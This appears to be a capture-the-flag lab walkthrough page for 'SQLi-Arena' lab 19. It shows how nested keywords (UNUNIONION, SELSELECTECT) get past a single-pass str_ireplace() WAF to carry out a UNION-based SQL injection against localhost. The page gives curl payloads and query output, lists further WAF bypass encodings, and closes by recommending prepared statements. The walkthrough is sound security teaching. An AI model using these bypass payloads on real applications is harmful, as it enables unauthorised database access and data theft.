<h4>Step 1: Normal Lookup</h4>
<p>
    Start by searching for a known user like <code>admin</code>. The page returns the user's
    username and role. No WAF alerts are triggered because there are no blocked keywords.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Lookup</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl "http://localhost/SQLi-Arena/mysql/lab19" -d "username=admin"<br><br>
        <span class="prompt">Input: </span>admin<br><br>
        <span class="prompt">Query: </span>SELECT username, role FROM users WHERE username = 'admin'<br><br>
        <span class="prompt">Result: </span>Username: admin | Role: administrator
    </div>
</div>

<h4>Step 2: Trigger the WAF</h4>
<p>
    Try a basic injection payload. The WAF detects and removes the blocked keywords.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. WAF Blocks Standard Injection</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl "http://localhost/SQLi-Arena/mysql/lab19" -d "username=%27+UNION+SELECT+1%2C2+FROM+flags+--+-"<br><br>
        <span class="prompt">Input: </span>' UNION SELECT 1,2 FROM flags -- -<br><br>
        <span class="prompt">WAF Active: </span>Keywords were detected and removed from your input.<br>
        <span class="prompt">Original: </span>' UNION SELECT 1,2 FROM flags -- -<br>
        <span class="prompt">Filtered: </span>'   1,2  flags  -<br><br>
        <span class="prompt">Query: </span>SELECT username, role FROM users WHERE username = ''   1,2  flags  -'<br><br>
        <span class="prompt">Result: </span>MySQL Error -- malformed query after keyword removal
    </div>
</div>

<h4>Step 3: Understand the WAF Flaw</h4>
<p>
    The WAF uses <code>str_ireplace()</code> which performs a <strong>single pass</strong> replacement.
    This means nested keywords survive the filter:
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Single-Pass Bypass Concept</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Nested: </span>UN<strong>UNION</strong>ION &rarr; WAF removes inner "UNION" &rarr; <strong>UNION</strong><br>
        <span class="prompt">Nested: </span>SEL<strong>SELECT</strong>ECT &rarr; WAF removes inner "SELECT" &rarr; <strong>SELECT</strong><br>
        <span class="prompt">Nested: </span>FR<strong>FROM</strong>OM &rarr; WAF removes inner "FROM" &rarr; <strong>FROM</strong><br>
        <span class="prompt">Note: </span><strong>--</strong> cannot be nested. <code>----</code> becomes empty because <code>str_ireplace()</code> removes ALL occurrences of each keyword in one pass. Instead, close the trailing quote with <code>'1'='1</code>.<br><br>
        <span class="prompt">Why? </span>str_ireplace() processes each keyword in turn and replaces ALL matches of that keyword globally. Nesting works for words like UNION because the outer letters are not themselves a keyword. But <code>----</code> contains two <code>--</code> occurrences, and both are removed.
    </div>
</div>

<h4>Step 4: Test a Simple Nested Bypass</h4>
<p>
    Try a simple test to confirm the nesting technique works.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Test Nesting</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl "http://localhost/SQLi-Arena/mysql/lab19" -d "username=%27+OORR+%271%27%3D%271"<br><br>
        <span class="prompt">Input: </span>' OORR '1'='1<br><br>
        <span class="prompt">WAF filters: </span>"or" removed from "OORR" &rarr; "OR"<br>
        <span class="prompt">After WAF: </span>' OR '1'='1<br><br>
        <span class="prompt">Query: </span>SELECT username, role FROM users WHERE username = '' OR '1'='1'<br><br>
        <span class="prompt">Result: </span>All 5 users returned (admin, john, jane, mike, sarah)! The bypass works.
    </div>
</div>

<h4>Step 5: Build the Full UNION Payload</h4>
<p>
    Now construct the full nested payload to extract the flag. The query returns 2 columns
    (<code>username, role</code>), so the UNION needs 2 values.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Nested Keyword Mapping</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">UNION &rarr; </span>UNUNIONION<br>
        <span class="prompt">SELECT &rarr; </span>SELSELECTECT<br>
        <span class="prompt">FROM &rarr; </span>FRFROMOM<br>
        <span class="prompt">WHERE &rarr; </span>WHWHEREERE<br>
        <span class="prompt">-- &rarr; </span>Cannot be nested; close trailing quote with '1'='1 instead<br>
    </div>
</div>

<h4>Step 6: Execute the Bypass Payload</h4>
<p>
    Enter the full nested payload in the search box.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 6. Full Bypass Payload</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl "http://localhost/SQLi-Arena/mysql/lab19" -d "username=%27+UNUNIONION+SELSELECTECT+flag_value%2C+2+FRFROMOM+flags+WHWHEREERE+%271%27%3D%271"<br><br>
        <span class="prompt">Input: </span>' UNUNIONION SELSELECTECT flag_value, 2 FRFROMOM flags WHWHEREERE '1'='1<br><br>
        <span class="prompt">WAF filters: </span><br>
        &nbsp;&nbsp;UNUNIONION &rarr; UNION<br>
        &nbsp;&nbsp;SELSELECTECT &rarr; SELECT<br>
        &nbsp;&nbsp;FRFROMOM &rarr; FROM<br>
        &nbsp;&nbsp;WHWHEREERE &rarr; WHERE<br><br>
        <span class="prompt">After WAF: </span>' UNION SELECT flag_value, 2 FROM flags WHERE '1'='1<br><br>
        <span class="prompt">Query: </span>SELECT username, role FROM users WHERE username = '' UNION SELECT flag_value, 2 FROM flags WHERE '1'='1'<br><br>
        <span class="prompt">Result: </span><br>
        &nbsp;&nbsp;Username: <strong>FLAG{w4f_byp4ss_k3yw0rd}</strong> | Role: 2
    </div>
</div>

<h4>Step 7: Submit the Flag</h4>
<p>
    Copy the flag from the results and paste it into the verification form:
    <code>FLAG{w4f_byp4ss_k3yw0rd}</code>.
</p>

<h4>Step 8: Other Bypass Techniques</h4>
<p>
    The nested keyword approach works against <code>str_ireplace()</code>. Other WAF bypass
    techniques exist for different filtering implementations:
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 8. Common WAF Bypass Techniques</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">1. Nesting: </span>UNUNIONION &rarr; UNION (defeats single-pass removal)<br>
        <span class="prompt">2. Case mixing: </span>uNiOn SeLeCt (defeats case-sensitive filters only)<br>
        <span class="prompt">3. Comments: </span>UN/**/ION SEL/**/ECT (defeats word-boundary matching)<br>
        <span class="prompt">4. URL encoding: </span>%55NION %53ELECT (defeats server-side string matching)<br>
        <span class="prompt">5. MySQL comments: </span>/*!50000UNION*/ /*!50000SELECT*/ (version-specific execution)<br>
        <span class="prompt">6. Whitespace: </span>UNION%09SELECT (tab instead of space)<br>
        <span class="prompt">7. Double encoding: </span>%2555NION (defeats single URL-decode)
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> Blacklist-based WAFs are inherently flawed. They try to enumerate
    &ldquo;bad&rdquo; inputs, but there are always bypass techniques. The correct defense is
    <strong>prepared statements</strong> (parameterized queries) which separate SQL structure from data
    entirely. WAFs should be a <em>defense-in-depth</em> layer, never the primary protection.
</div>
